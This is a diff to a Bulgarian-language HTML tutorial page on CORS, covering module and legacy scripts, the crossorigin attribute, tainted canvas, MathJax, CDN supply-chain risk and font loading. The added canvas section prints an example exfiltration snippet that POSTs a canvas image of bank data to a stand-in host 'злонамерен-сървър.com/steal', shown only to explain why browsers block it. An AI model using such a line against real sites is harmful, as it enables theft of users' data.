@@ -358,15 +358,21 @@
           <span class="code-lang">HTML</span>
         </div>
         <div class="code-body"><span class="c-comment">&lt;!-- Обикновен script — без CORS --&gt;</span>
-<span class="c-tag">&lt;script</span> <span class="c-attr">src</span>=<span class="c-val">"https://cdn.com/lib.js"</span><span class="c-tag">&gt;&lt;/script&gt;</span>
+<span class="c-tag">&lt;script</span> <span class="c-attr">src</span>=<span class="c-val">"https://cdn.jsdelivr.net/lib.js"</span><span class="c-tag">&gt;&lt;/script&gt;</span>
 
 <span class="c-comment">&lt;!-- Module — минава през CORS! --&gt;</span>
 <span class="c-tag">&lt;script</span> <span class="c-attr">type</span>=<span class="c-val">"module"</span> <span class="c-attr">src</span>=<span class="c-val">"https://друг-домейн.com/mod.js"</span><span class="c-tag">&gt;&lt;/script&gt;</span></div>
       </div>
       <span class="result err">❌ CORS грешка ако сървърът няма Access-Control-Allow-Origin</span>
       <div class="note" style="margin-top:12px">
-        <strong>Защо?</strong> Модулите са нов стандарт и умишлено са проектирани с CORS — по-сигурно поведение от legacy <code style="font-family:var(--mono)">&lt;script&gt;</code>.
-      </div>
+		  <strong>Защо?</strong> ES модулите (<code style="font-family:var(--mono)">type="module"</code>) са нов стандарт и умишлено са проектирани с CORS — за разлика от legacy <code style="font-family:var(--mono)">&lt;script&gt;</code>.
+
+		  <p style="margin-top:10px">Модулите могат да импортират JavaScript от съвсем различни домейни чрез <code style="font-family:var(--mono)">import</code>/<code style="font-family:var(--mono)">export</code> — браузърът не знае предварително от кои домейни, затова CORS е задължителен от самото начало. Не можеш да го заобиколиш като пропуснеш <code style="font-family:var(--mono)">type="module"</code> — браузърът ще хвърли синтактична грешка и скриптът изобщо няма да се изпълни.</p>
+
+		  <p style="margin-top:8px">Legacy скриптовете са един затворен файл — няма верига от непознати <code style="font-family:var(--mono)">import</code>-и, затова няма нужда от CORS на ниво зареждане.</p>
+
+		  <p style="margin-top:8px"><strong>Внимание:</strong> Legacy скриптовете не са напълно безопасни — могат да се зареждат от произволен домейн. За допълнително ограничение настрой <strong>Content Security Policy (CSP)</strong> на сървъра или чрез <code style="font-family:var(--mono)">&lt;meta&gt;</code> таг в HTML страницата.</p>
+		</div>
     </div>
 
     <!-- 2. fetch / XHR -->
@@ -409,13 +415,13 @@
           <span class="code-lang">HTML</span>
         </div>
         <div class="code-body"><span class="c-comment">&lt;!-- Без crossorigin — работи нормално --&gt;</span>
-<span class="c-tag">&lt;script</span> <span class="c-attr">src</span>=<span class="c-val">"https://cdn.com/lib.js"</span><span class="c-tag">&gt;&lt;/script&gt;</span>     <span class="c-ok">✓ OK</span>
+<span class="c-tag">&lt;script</span> <span class="c-attr">src</span>=<span class="c-val">"https://cdn.jsdelivr.net/lib.js"</span><span class="c-tag">&gt;&lt;/script&gt;</span>     <span class="c-ok">✓ OK</span>
 
 <span class="c-comment">&lt;!-- С crossorigin — CORS се активира! --&gt;</span>
-<span class="c-tag">&lt;script</span> <span class="c-attr">crossorigin</span> <span class="c-attr">src</span>=<span class="c-val">"https://cdn.com/lib.js"</span><span class="c-tag">&gt;&lt;/script&gt;</span>  <span class="c-err">❌</span>
+<span class="c-tag">&lt;script</span> <span class="c-attr">crossorigin</span> <span class="c-attr">src</span>=<span class="c-val">"https://cdn.jsdelivr.net/lib.js"</span><span class="c-tag">&gt;&lt;/script&gt;</span>  <span class="c-err">❌</span>
 
 <span class="c-comment">&lt;!-- Същото за img --&gt;</span>
-<span class="c-tag">&lt;img</span> <span class="c-attr">crossorigin</span> <span class="c-attr">src</span>=<span class="c-val">"https://cdn.com/photo.jpg"</span> <span class="c-tag">/&gt;</span>      <span class="c-err">❌</span></div>
+<span class="c-tag">&lt;img</span> <span class="c-attr">crossorigin</span> <span class="c-attr">src</span>=<span class="c-val">"https://cdn.jsdelivr.net/photo.jpg"</span> <span class="c-tag">/&gt;</span>      <span class="c-err">❌</span></div>
       </div>
       <div class="note">
         <strong>Защо изобщо се ползва?</strong> За да виждаш пълни stack traces в конзолата при JS грешки от CDN. Без него браузърът крие детайлите на грешката за сигурност. Но тогава CDN-ът трябва да поддържа CORS.
@@ -532,8 +538,8 @@ img.<span class="c-attr">crossOrigin</span> = <span class="c-str">'anonymous'</s
         </tbody>
       </table>
     </div>
-
-    <!-- Golden rule -->
+	
+	<!-- Golden rule -->
     <div class="rule-box">
       <h3>Златното правило</h3>
       <ul class="rule-list">
@@ -551,6 +557,110 @@ img.<span class="c-attr">crossOrigin</span> = <span class="c-str">'anonymous'</s
         </li>
       </ul>
     </div>
+	
+	<!-- Canvas attack example -->
+<div class="note" style="margin-top:32px">
+  <strong>Защо canvas четенето е опасно?</strong> Браузърът показва картинката нормално — потребителят не вижда нищо подозрително. Но JavaScript може да прочете всеки пиксел и да изпрати данните навън:
+
+  <div class="code-block" style="margin-top:12px">
+    <div class="code-header">
+      <div class="code-dot" style="background:#ff5f57"></div>
+      <div class="code-dot" style="background:#febc2e"></div>
+      <div class="code-dot" style="background:#28c840"></div>
+      <span class="code-lang">JavaScript</span>
+    </div>
+    <div class="code-body"><span class="c-comment">// Злонамерен сайт зарежда картинка от банката ти</span>
+<span class="c-kw">const</span> img = <span class="c-kw">new</span> <span class="c-fn">Image</span>();
+img.<span class="c-attr">src</span> = <span class="c-str">'https://bank.com/qr-with-account-data.png'</span>;
+ctx.<span class="c-fn">drawImage</span>(img, 0, 0);  <span class="c-ok">✓ Показва се нормално</span>
+
+<span class="c-comment">// Чете цялата картинка като base64 и я изпраща</span>
+<span class="c-fn">fetch</span>(<span class="c-str">'https://злонамерен-сървър.com/steal'</span>, {
+  <span class="c-attr">method</span>: <span class="c-str">'POST'</span>,
+  <span class="c-attr">body</span>: canvas.<span class="c-fn">toDataURL</span>()  <span class="c-err">← цялата картинка заминава</span>
+});
+
+<span class="c-comment">// Затова браузърът блокира и двете:</span>
+canvas.<span class="c-fn">toDataURL</span>();      <span class="c-err">❌ SecurityError: Tainted canvas</span>
+ctx.<span class="c-fn">getImageData</span>(...); <span class="c-err">❌ SecurityError: Tainted canvas</span></div>
+  </div>
+</div>
+	
+<!-- Bonus 1: MathJax -->
+<div class="section">
+  <div class="section-num">БОНУС 1 —</div>
+  <h2>Математически формули с MathJax</h2>
+  <p>Ако искаш да изписваш математически формули в страницата си, можеш да ползваш MathJax — legacy скрипт от <a href="https://docs.mathjax.org/en/latest/web/start.html" style="color:var(--blue)" target="_blank" rel="noopener noreferrer">docs.mathjax.org</a>, който не минава през CORS:</p>
+  <div class="code-block">
+    <div class="code-header">
+      <div class="code-dot" style="background:#ff5f57"></div>
+      <div class="code-dot" style="background:#febc2e"></div>
+      <div class="code-dot" style="background:#28c840"></div>
+      <span class="code-lang">HTML</span>
+    </div>
+    <div class="code-body"><span class="c-tag">&lt;script</span> <span class="c-attr">id</span>=<span class="c-val">"MathJax-script"</span> <span class="c-attr">async</span> <span class="c-attr">src</span>=<span class="c-val">"https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"</span><span class="c-tag">&gt;&lt;/script&gt;</span>
+
+<span class="c-comment">&lt;!-- След това пишеш LaTeX директно в HTML-а: --&gt;</span>
+$$E = mc^2$$
+
+\( \int_0^\infty e^{-x^2} dx = \frac{\sqrt{\pi}}{2} \)</div>
+  </div>
+  <div class="note" style="margin-top:12px">
+    <strong>Как работи?</strong> MathJax сканира страницата за LaTeX нотация и я превръща в <code style="font-family:var(--mono)">SVG</code> или <code style="font-family:var(--mono)">HTML+CSS</code> чрез елементи като <code style="font-family:var(--mono)">&lt;mjx-container&gt;</code>. Формулите са векторна графика — мащабират се без замъгляване. За разлика от canvas, тук няма четене на пиксели и няма нужда от CORS.
+  </div>
+</div>
+
+	<!-- Supply chain warning -->
+	<div class="section">
+	  <div class="section-num">⚠ ВНИМАНИЕ —</div>
+	  <h2>CDN не означава автоматично безопасно</h2>
+	  <p>jsdelivr е надежден и популярен CDN, но „безопасно" зависи от <em>какво</em> зареждаш, не само от <em>откъде</em>. Ако пакетът сам по себе си е злонамерен или компрометиран, jsdelivr само го доставя бързо.</p>
+
+	  <div class="code-block">
+		<div class="code-header">
+		  <div class="code-dot" style="background:#ff5f57"></div>
+		  <div class="code-dot" style="background:#febc2e"></div>
+		  <div class="code-dot" style="background:#28c840"></div>
+		  <span class="code-lang">HTML</span>
+		</div>
+		<div class="code-body"><span class="c-comment">&lt;!-- По-рисковано — взима най-новата версия автоматично --&gt;</span>
+<span class="c-tag">&lt;script</span> <span class="c-attr">src</span>=<span class="c-val">"https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"</span><span class="c-tag">&gt;&lt;/script&gt;</span>  <span class="c-err">⚠</span>
+
+<span class="c-comment">&lt;!-- По-безопасно — точна версия, знаеш точно какво зареждаш --&gt;</span>
+<span class="c-tag">&lt;script</span> <span class="c-attr">src</span>=<span class="c-val">"https://cdn.jsdelivr.net/npm/mathjax@4.0.0/tex-mml-chtml.js"</span><span class="c-tag">&gt;&lt;/script&gt;</span>  <span class="c-ok">✓</span></div>
+  </div>
+
+  <div class="note" style="margin-top:12px; border-left-color:var(--yellow); background:var(--yellow-bg); color:#c9a84c">
+	<strong style="color:var(--yellow)">Supply chain attack:</strong> Ако някой качи компрометирана нова версия на пакета, ти автоматично я получаваш при следващото зареждане на страницата. Това се казва <strong style="color:var(--yellow)">supply chain attack</strong> и се е случвало с реални популярни пакети.
+	  </div>
+	</div>
+	
+	<!-- Bonus 2: Fonts and CORS -->
+	<div class="section">
+	  <div class="section-num">БОНУС 2 —</div>
+	  <h2>Защо шрифтовете винаги минават през CORS</h2>
+	  <p>Две причини:</p>
+	  <p><strong style="color:var(--text-head)">Исторически:</strong> Шрифтовете са добавени към уеб стандартите <em>след</em> като CORS вече е съществувал — за разлика от <code style="font-family:var(--mono)">&lt;img&gt;</code> и <code style="font-family:var(--mono)">&lt;script&gt;</code>, които предхождат CORS и са останали без проверка за обратна съвместимост.</p>
+	  <p><strong style="color:var(--text-head)">Лицензионен:</strong> Шрифтовете са платени продукти. Без CORS всеки би могъл да зареди шрифт лицензиран за един домейн и да го ползва на друг. CORS позволява на сървъра да каже „давам този шрифт само на тези домейни".</p>
+
+	  <div class="code-block" style="margin-top:16px">
+		<div class="code-header">
+		  <div class="code-dot" style="background:#ff5f57"></div>
+		  <div class="code-dot" style="background:#febc2e"></div>
+		  <div class="code-dot" style="background:#28c840"></div>
+		  <span class="code-lang">CSS</span>
+		</div>
+		<div class="code-body"><span class="c-comment">/* ✓ Работи — Google е разрешил на всички */</span>
+<span class="c-kw">@import</span> <span class="c-fn">url</span>(<span class="c-str">'https://fonts.googleapis.com/css2?family=Sofia+Sans'</span>);
+
+<span class="c-comment">/* ❌ Може да не работи — зависи от сървъра */</span>
+<span class="c-kw">@import</span> <span class="c-fn">url</span>(<span class="c-str">'https://някой-друг-сайт.com/fonts/beautiful.woff2'</span>);</div>
+	  </div>
+
+	  <div class="note" style="margin-top:12px">
+		<strong>Google Fonts работи</strong> защото Google добавя <code style="font-family:var(--mono)">"Access-Control-Allow-Origin: *" </code> към всички шрифтове — разрешава зареждане от всеки домейн.
+	  </div>
+	</div>
 
   </div><!-- /content -->
 
